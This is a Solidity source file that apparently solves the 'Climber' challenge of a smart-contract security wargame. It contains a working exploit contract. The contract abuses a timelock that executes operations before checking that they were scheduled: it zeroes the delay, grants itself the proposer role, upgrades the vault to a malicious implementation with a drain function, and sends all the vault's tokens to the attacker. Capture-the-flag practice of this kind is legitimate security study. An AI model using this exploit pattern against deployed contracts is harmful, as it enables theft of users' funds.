// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../climber/ClimberVault.sol";

contract BadClimberVault is ClimberVault {
    function drain(IERC20 token, address recepient) public {
        token.transfer(recepient, token.balanceOf(address(this)));
    }
}

contract ClimberAttacker{

    address public immutable player;
    ClimberVault public immutable vault;
    ClimberTimelock public immutable timelock;
    IERC20 public immutable token;
    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(address _vault, address _token) {

        player = msg.sender;

        vault = ClimberVault(_vault);

        timelock = ClimberTimelock(payable(
            vault.owner()
        ));

        token = IERC20(_token);

    }

    function attack() public returns (bool success, bytes memory result) {

        BadClimberVault badClimberVault = new BadClimberVault();

        targets = [
            address(timelock), 
            address(timelock), 
            address(vault), 
            address(this)
        ];

        values = [0, 0, 0, 0];

        dataElements = [
            abi.encodeCall(timelock.updateDelay, (0)), // remove delay
            abi.encodeCall(
                timelock.grantRole, 
                (PROPOSER_ROLE, address(this))
            ), // grant PROPOSER role to the attacker (this contract)
            abi.encodeCall(
                vault.upgradeTo, 
                (address(badClimberVault))
            ), // upgrade the vault to an instance of BadClimberVault
            abi.encodeCall(this.scheduleTimelockOperation, ()) // schedule these 4 tasks
        ];

        timelock.execute(targets, values, dataElements, 0);

        return address(vault).call(abi.encodeCall(
            BadClimberVault.drain, 
            (token, player)
        )); // drain the vault

    }

    function scheduleTimelockOperation() public {
        timelock.schedule(targets, values, dataElements, 0);
    }
    
}